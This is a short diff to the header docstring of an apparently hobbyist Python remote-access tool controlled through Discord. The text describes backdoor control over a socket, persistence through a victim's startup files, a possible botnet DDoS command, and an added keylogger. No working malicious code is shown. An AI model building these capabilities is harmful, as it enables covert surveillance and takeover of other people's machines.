@@ -5,7 +5,8 @@ reconnect with client. Also provides me a way to destroy this application by sim
 code is ever leaked. Basic backdoor control will be provided at this level and user can use socket connection to
 initiate more complex functionality. Depending how deep i go down this rabbit hole i might add this process to victim
 startup file to make it persistent through restarts. may also implement a botnet ddos command which will be illegal to
-test so probably wont end up doing that unless im interested in crashing my own internet.
+test so probably wont end up doing that unless im interested in crashing my own internet. EDIT# added new commands and
+threading support for keylogger.
 """
 #Written and designed by Stone Preheim
 from discord.ext import commands
